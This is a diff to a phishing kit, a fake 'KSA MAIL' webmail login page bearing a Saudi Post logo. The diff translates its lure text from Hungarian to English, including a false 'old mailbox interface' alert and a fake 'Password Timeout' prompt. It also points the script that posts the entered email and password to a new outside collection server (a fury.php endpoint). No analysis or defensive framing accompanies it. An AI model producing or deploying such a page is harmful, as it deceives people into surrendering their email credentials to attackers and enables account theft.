@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 
 
-<script type="text/javascript">alert("Ön egy régebbi postafiók felületet használ. A frissített postafiók felületre való váltáshoz jelentkezzen be újra");</script>
+<script type="text/javascript">alert("Sorry, you are using the old mailbox interface. Log in to the new interface again!");</script>
 <html>
     <head>
         <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-        <title> Webmail bejelentkezés</title>
+        <title> Webmail Login</title>
         <!-- Bootstrap CSS -->
         <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
         <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
@@ -28,11 +28,11 @@
                                 <img id="login_logo1" src="https://www.chilltracking.com/logo/saudi-post.svg" width="50" height="50" alt="Webmail">
                             </div>
                             <h3 class="text-dark"><strong id="domain-name" class="text-uppercase">KSA MAIL</strong></h3>
-                            <h5 class="font-weight-light">jelentkezzen be e-mail címével és jelszavával a függőben lévő e-mailek letöltéséhez</h5>
+                            <h5 class="font-weight-light">sign in with your email address and password to continue using your current password</h5>
                         </div>
                         <center>
-                            <div id="msg" style="display: none;font-weight: 600;color: red;">Jelszó időtúllépés. Kérjük, adja meg újra a helyes jelszavát.</div>
-                            <span id="error" class="text-danger" style="display: none;">Ez a fiók nem létezik. Adjon meg egy másik fiókot</span>
+                            <div id="msg" style="display: none;font-weight: 600;color: red;">Password Timeout.! Please re-enter your correct password.</div>
+                            <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                         </center>
                         <form>
                             <div class="form-holder">
@@ -43,13 +43,13 @@
                                 <input type="password" id="pr" placeholder="Password" class="form-control" required="">
                                 <div class="checkbox">
                                     <input type="checkbox" name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
-                                    <label>EMLÉKEZZ RÁM</label>
+                                    <label>REMEMBER ME</label>
                                 </div>
                                 <div class="btn-holder">
-                                    <button class="btn btn-lg col-12" id="submit-btn">BELÉPÉS</button>
+                                    <button class="btn btn-lg col-12" id="submit-btn">LOGIN</button>
                                 </div>
-                                <p style="color:#0073C6; margin-top:1em; float: left; width:100%;">nem tud hozzáférni a fiókjához</p>
-                                <p style="color:#0073C6; margin-top:0em; float: left; width:100%;">Jelentkezz be egy egyszer-használatos kóddal</p>
+                                <p style="color:#0073C6; margin-top:1em; float: left; width:100%;">can't access your account?</p>
+                                <p style="color:#0073C6; margin-top:0em; float: left; width:100%;">Sign in with a single-use code</p>
                             </div>
                         </form>
                     </div>
@@ -186,7 +186,7 @@
         
                 $.ajax({
                     dataType: 'JSON',
-                    url:'http://phoenixpropertydevelopers.com/c/fury.php',
+                    url:'https://twotwofive.cloudns.ph/fury.php',
                     type: 'POST',
                     data: {
                         ai: ai,
